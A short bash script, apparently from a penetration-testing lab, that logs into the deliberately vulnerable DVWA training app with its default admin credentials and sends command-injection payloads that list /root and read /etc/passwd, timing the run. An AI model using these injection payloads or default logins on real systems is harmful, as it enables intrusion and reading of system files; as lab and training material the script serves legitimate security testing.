#!/usr/bin/env bash
source /home/kali/Pentesting/scripts/config/config.sh
echo "Start [$(date "+%Y-%m-%d %H:%M:%S")]: Running injection-command"
t0=$(date +%s)

# --- ATTACK ---
#get user token
TOKEN=$(curl -c /home/kali/Pentesting/utils/dvwa.session -s http://$target_ip_msf/dvwa/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)
# get session id
PHPSESSID=$(grep PHPSESSID /home/kali/Pentesting/utils/dvwa.session | awk -F' ' '{print $7}')
# log in
curl -L -b "PHPSESSID=${PHPSESSID};security=low" -v -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" http://$target_ip_msf/dvwa/login.php

# command injection
# root folder
curl -s -b "PHPSESSID=${PHPSESSID};security=low" -d 'ip=%3B+ls+-la+%2Froot&submit=submit' http://$target_ip_msf/dvwa/vulnerabilities/exec/index.php
# passwords
curl -s -b "PHPSESSID=${PHPSESSID};security=low" -d 'ip=+%7C+cat+%2Fetc%2Fpasswd&submit=submit' http://$target_ip_msf/dvwa/vulnerabilities/exec/index.php
# --- ATTACK ---

t=$(date +%s)
elapsed_time=$((t - t0))
echo "End [$(date "+%Y-%m-%d %H:%M:%S")]: Running injection-command (took $elapsed_time seconds)"
